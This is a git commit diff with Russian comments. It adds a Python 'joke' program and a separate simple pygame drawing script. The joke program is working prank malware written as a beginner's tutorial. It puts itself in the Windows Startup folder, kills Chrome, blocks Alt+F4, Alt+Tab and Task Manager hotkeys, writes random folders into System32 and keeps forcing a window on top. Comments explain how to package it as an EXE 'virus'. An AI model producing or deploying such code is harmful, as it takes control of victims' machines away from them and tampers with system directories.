4d36fee012cbf45ecc9a5cb9374bd479586860d5
StanislavUIT <klibashev.s@beldor.centr.by>
2021-11-16 17:35:38 +0300

    автозагрузка, ровер других окон и многое другое..

--- joke.py
+++ joke.py
@@ -1,23 +1,66 @@
+# РУКОВОДСТВО ДЛЯ ЧАЙНИКОВ
+
+# ОТНОСИТСЯ К ОПИСАНИЮ
+
+# когда что-то находится в этих --><-- стрелочках ниже это можно изменять :  print('-->Арсений умный человек и хороший Ютубер<--')
+
+
+# ТЕГИ
+# теги пишутся в круглых скобках (тег)
+# тег : изменяемо (роби чего хочешь)
+# тег : кодик (желательно изменить под себя)
+# тег : неизменяемо (нельзя каким либо образом изменять)
+# тег : не удаляемо (можно добавлять но не удалять или изменять это)
+# тег : удаляемо (можно[желательно вырезать под корень])
+#  над другое: можно удалять, можно изменять
+
+# напиши в консоль для установки необходимых библеотек:
+# pip install ctypes, keyboard, PyAutoGUI, pygame, pyinstaller, pywin32-ctypes
+
+# КОД
+
+# импортируем то что надо (изменяемо, не удаляемо)
 import ctypes
+import time
 from ctypes import wintypes
 import os
 import keyboard
 import random
 import pygame
 import pyautogui
+import getpass
+from pygame.draw import *
+import webbrowser
+
 pygame.init()
 
-# os.system("taskkill chrome.exe")
-# os.system("taskkill taskmgr.exe")
-keyboard.add_hotkey("alt + f4", lambda: print('это не выход!'), suppress=True)
-keyboard.add_hotkey("alt + tab", lambda: print('не уйдёшь!'), suppress=True)
-keyboard.add_hotkey("Ctrl + Shift + Esc", lambda: print('не-а )))'), suppress=True)
-keyboard.add_hotkey("Alt +Esc", lambda: print('не так просто'), suppress=True)
-keyboard.add_hotkey("Ctrl +Esc", lambda: print('не так просто'), suppress=True)
-keyboard.add_hotkey("f1", lambda: print('Я твоя помошь'), suppress=True)
+# получаем имя пользователя (не изменяемо)
+USER_NAME = getpass.getuser()
 
 
-def random_id(length):
+# функция добавляющаяся в автозагрузку зависит от USER_NAME (не изменяемо)
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" %s' % file_path)
+
+
+# убиваем chrome(удаляемо, неизменяемо), os.system("-->taskkill /IM chrome.exe<--")
+os.system("taskkill /IM chrome.exe")
+
+# блокируем нажатия клавиш(изменяемо), keyboard.add_hotkey("-->alt + f4<--", None suppress=True)
+keyboard.add_hotkey("alt + f4", lambda: None, suppress=True)
+keyboard.add_hotkey("alt + tab", lambda: None, suppress=True)
+keyboard.add_hotkey("Ctrl + Shift + Esc", lambda: None, suppress=True)
+keyboard.add_hotkey("Alt +Esc", lambda: None, suppress=True)
+keyboard.add_hotkey("Ctrl +Esc", lambda: None, suppress=True)
+keyboard.add_hotkey("f1", lambda: None, suppress=True)
+
+
+# создание случайного названия (удаляемо, не изменяемо)
+def random_name(length):
     number = '0123456789'
     alpha = 'abcdefghijklmnopqrstuvwxyz'
     idshnik = 'joke_'
@@ -27,26 +70,33 @@ def random_id(length):
     return idshnik
 
 
+# создание нужного количества папок со случайным названием в папке, os.mkdir(r"-->C:\Windows\System32\\<--" + na)
+# зависит от random_name (изменяемо)
 def fold(col):
     for i in range(col):
-        na = random_id(50)
-        os.mkdir("C:\Windows\System32\\"+na)
+        na = random_name(50)
+        os.mkdir(r"C:\Windows\System32\\" + na)
 
 
+# что нам делать:
+# =====================================================================================================================
 
-for i in range(1000):
-    import pygame
-    from pygame.draw import *
-    pygame.init()
+# создаём картинки (кодик,удаляемо)
+# бесконечный цикл ಠ益ಠ
+while True:
+    # размер и цвет окна
+    # размер x, y ; SCREEN = (-->1300, 150<--)
+    # цвет (можно в RGB или название цвета), SCREEN_COLOR = -->"white"<--
     SCREEN = (400, 400)
     SCREEN_COLOR = "white"
+    # не просят не трогай(по стандарту)
     SCREEN1 = SCREEN[0]
     SCREEN2 = SCREEN[1]
     FPS = 30
     screen = pygame.display.set_mode(SCREEN)
     N = 10
-    color = (255, 255, 255)
     rect(screen, SCREEN_COLOR, [0, 0, SCREEN1, SCREEN2])
+    # если чего-то надо написать или нарисовать
     class my_face:
         class skin:
             circle(screen, color="yellow", radius=150, center=[200, 200])
@@ -61,28 +111,36 @@ for i in range(1000):
         class mouth:
             ellipse(screen, "black", [110, 200, 180, 120])
             ellipse(screen, "yellow", [110, 220, 180, 120])
+    # перестань творить
     pygame.display.update()
     clock = pygame.time.Clock()
     finished = False
     hwnd = pygame.display.get_wm_info()['window']
-
+    # делаем поверх других окон
     user32 = ctypes.WinDLL("user32")
     user32.SetWindowPos.restype = wintypes.HWND
     user32.SetWindowPos.argtypes = [wintypes.HWND, wintypes.HWND, wintypes.INT, wintypes.INT, wintypes.INT,
                                     wintypes.INT, wintypes.UINT]
     user32.SetWindowPos(hwnd, -1, 400, 400, 0, 0, 0x0001)
+    # при закрытии окна:
     while not finished:
         clock.tick(FPS)
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
-                for i in range(10):
+                # двигаем мышкой и запускаем рикролл :-) (кодик, удаляемо)
+                for u in range(1):
                     try:
-                        pyautogui.moveRel(300, 0, duration=0.25)
-                        pyautogui.moveRel(0, 300, duration=0.25)
-                        pyautogui.moveRel(-300, 0, duration=0.25)
-                        pyautogui.moveRel(0, -300, duration=0.25)
+                        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley', new=0)
+                        pyautogui.moveRel(500, 500, duration=0.25)
+                        pyautogui.moveRel(-300, -300, duration=0.25)
                     except:
                         pass
+                    # не трогай если не удаляешь вывод чего-либо(не изменяемо)
                 finished = True
     pygame.quit()
+    time.sleep(300)
+# =====================================================================================================================
 
+# для создания EXE файла в консоль пишешь: pyinstaller --onefole --noconsole название_файла.py
+# находишь в папке проекта папку dist и вот твой EXE вирус
+# план по захвату человечества ГОТОВ на 100%
--- pygamer.py
+++ pygamer.py
@@ -1,1 +1,44 @@
-import pygame
+import pygame as pg
+from pygame.draw import *
+
+pg.init()
+
+SCREEN = (400, 400)
+SCREEN_COLOR = "white"
+
+SCREEN1 = SCREEN[0]
+SCREEN2 = SCREEN[1]
+FPS = 30
+screen = pg.display.set_mode(SCREEN)
+
+N = 10
+color = (255, 255, 255)
+rect(screen, SCREEN_COLOR, [0, 0, SCREEN1, SCREEN2])
+
+# rect(screen, 'blue', [50, 100, 250, 200])
+# circle(screen, 'gray', [125, 125], 20)
+# circle(screen, 'red', [125, 125], 20, 2)
+
+x1, y1, x2, y2 = 30, 30, 300, 200
+
+rect(screen, 'blue', [x1, y1, x2 - x1, y2 - y1], 3)
+height = (x2 - x1) // 10
+step = x1 + height
+
+for d in range(10):
+    line(screen, 'cyan', [step, y1], [step, y2])
+    step += height
+
+polygon(screen, 'red', [[100,90],[200, 350],[120, 70]])
+
+pg.display.update()
+clock = pg.time.Clock()
+finished = False
+
+while not finished:
+    clock.tick(FPS)
+    for event in pg.event.get():
+        if event.type == pg.QUIT:
+            finished = True
+
+pg.quit()
